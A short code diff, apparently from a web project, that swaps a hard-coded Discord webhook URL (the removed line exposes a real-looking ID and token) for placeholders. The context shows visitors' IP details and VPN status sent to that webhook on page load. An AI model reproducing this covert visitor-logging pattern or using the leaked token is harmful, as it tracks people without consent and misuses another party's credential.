@@ -8,7 +8,7 @@ $(document).ready(function () {
                          + 'VPN: ' + (ipData.usingVPN === true ? 'Detected' : 'Not Detected');
 
             $.ajax({
-                url:  "https://discord.com/api/webhooks/1290539045935517707/Y-3_x6_HtrRGrh4sCmAiUjrh3NCgXwS2vNsl0VAx8ij76inM30SrmDO9x_o4wXanrGuq",
+                url:  "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN",
                 type: 'POST',
                 data: JSON.stringify({ content: message }),
                 contentType: 'application/json'
